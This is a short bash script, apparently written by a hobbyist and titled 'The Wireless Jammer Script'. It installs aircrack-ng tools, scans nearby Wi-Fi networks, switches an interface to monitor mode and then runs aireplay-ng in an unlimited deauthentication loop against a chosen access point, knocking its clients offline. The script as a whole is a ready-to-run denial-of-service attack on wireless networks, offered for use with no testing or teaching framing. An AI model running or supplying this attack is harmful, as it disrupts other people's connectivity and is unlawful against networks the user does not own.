#Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks. 
#Dependencies: net-tools, egrep, aircrack-ng
if [ ! -f '/etc/apt' ]
then
echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits."
echo "checking for dependencies.."
fi
if [ ! -f '/usr/bin/aircrack-ng' ]
then
echo "loading aircrack.."
sudo apt install aircrack-ng -y > nul
fi
if [ ! -f '/bin/egrep' ]
then
echo "loading egrep.."
sudo apt install egrep -y > nul
fi
if [ ! -f '/sbin/iwlist' ]
then
echo "loading net-tools.."
sudo apt install net-tools -y > nul
fi
echo "dependency check done.." && clear
#end of dependencie check
#artwork
tput setaf 1
echo "        / /\                /\ \       /\_\            /\ \       _\ \          _\ \   " 
echo "       / /  \              /  \ \     / / /  _         \ \ \     /\__ \        /\__ \  "
echo "      / / /\ \            / /\ \ \   / / /  /\_\       /\ \_\   / /_ \_\      / /_ \_\ "
echo "     / / /\ \ \          / / /\ \_\ / / /__/ / /      / /\/_/  / / /\/_/     / / /\/_/ "
echo "    / / /  \ \ \        / / /_/ / // /\_____/ /      / / /    / / /         / / /      "
echo "   / / /___/ /\ \      / / /__\/ // /\_______/      / / /    / / /         / / /       "
echo "  / / /_____/ /\ \    / / /_____// / /\ \ \        / / /    / / / ____    / / / ____   "
echo " / /_________/\ \ \  / / /      / / /  \ \ \   ___/ / /__  / /_/_/ ___/\ / /_/_/ ___/\ "
echo "/ / /_       __\ \_\/ / /      / / /    \ \ \ /\__\/_/___\/_______/\__\//_______/\__\/ "
echo "\_\___\     /____/_/\/_/       \/_/      \_\_\\/_________/\_______\/    \_______\/     "
echo "		The Wireless Jammer Script for debianesque Systems	"
echo "								                                        "
tput sgr0
#end of artwork
iwconfig
echo "Interface name(e.g. wlan0):"
read inter
clear
echo "scanning networks.."
sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
echo "Choose Channel:"
read chan
echo "Please wait.. monitor mode is being enabled.."
trap 'airmon-ng stop $inter\mon > nul && exit 1' INT
sudo airmon-ng start $inter $chan > nul
echo "MAC of Access-Points:"
read macacc
echo "loading attack..."
sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
sudo airmon-ng stop $inter\mon > nul
exit 0
